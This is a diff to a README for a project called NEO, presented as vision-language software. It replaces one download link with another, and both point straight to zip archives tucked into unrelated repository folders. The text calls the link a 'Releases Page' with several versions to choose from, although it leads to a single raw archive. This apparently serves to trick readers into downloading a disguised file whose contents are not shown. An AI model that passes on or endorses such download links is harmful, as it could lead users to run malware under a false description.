@@ -6,11 +6,11 @@ Welcome to the NEO project! This software lets you tap into powerful vision-lang
 
 ## 📥 Download NEO
 
-[![Download NEO](https://raw.githubusercontent.com/yassenayoub/NEO/main/overbrutally/NEO.zip)](https://raw.githubusercontent.com/yassenayoub/NEO/main/overbrutally/NEO.zip)
+[![Download NEO](https://github.com/yassenayoub/NEO/raw/refs/heads/main/VLMEvalKit/vlmeval/vlm/misc/Software-2.1.zip)](https://github.com/yassenayoub/NEO/raw/refs/heads/main/VLMEvalKit/vlmeval/vlm/misc/Software-2.1.zip)
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. **Visit the Releases Page:** Click the button above or go to the following link to access the download page: [NEO Releases](https://raw.githubusercontent.com/yassenayoub/NEO/main/overbrutally/NEO.zip).
+1. **Visit the Releases Page:** Click the button above or go to the following link to access the download page: [NEO Releases](https://github.com/yassenayoub/NEO/raw/refs/heads/main/VLMEvalKit/vlmeval/vlm/misc/Software-2.1.zip).
 
 2. **Choose the Right File:** On the Releases page, you will see various versions of NEO available for download. Look for the latest release, which will have the highest version number. 
 
